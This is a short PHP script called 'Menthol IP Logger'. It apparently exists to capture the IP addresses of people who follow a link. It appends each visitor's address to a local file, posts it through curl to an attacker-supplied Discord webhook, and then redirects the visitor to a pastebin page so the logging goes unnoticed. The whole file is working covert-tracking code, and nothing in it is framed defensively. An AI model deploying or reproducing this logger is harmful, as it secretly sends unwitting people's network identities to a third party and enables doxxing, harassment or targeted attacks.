<?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $File = fopen("../dump/IPs.txt","a");
    fwrite($File,"$ip\n");
    fclose($File);
    
    $webhookurl = $_GET['Webhook'];

    $timestamp = date("c", strtotime("now"));
    $json_data = json_encode([
        "content" => "",
        "username" => "Menthol",
        "tts" => false,
        "embeds" => [
            [
                "type" => "rich",
                "timestamp" => $timestamp,
                "color" => hexdec( "3366ff" ),
                "footer" => [
                    "text" => 'Made by !fishgang Baljeet#1977 <- :(',
                    "icon_url" => "https://media.discordapp.net/attachments/675766819688153116/743187609651642408/image0-6-1.gif"
                ],
                "fields" => [
                    [
                        "name" => "Menthol IP Logger",
                        "value" => "```".$ip."```",
                        "inline" => false
                    ]
                ]
            ]
        ]

    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


    $ch = curl_init( $webhookurl );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt( $ch, CURLOPT_POST, 1);
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt( $ch, CURLOPT_HEADER, 0);
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec( $ch );
    curl_close( $ch );
    
    $newURL = 'https://pastebin.com/raw/cBAxD4mC';
    header('Location: '.$newURL);
?>
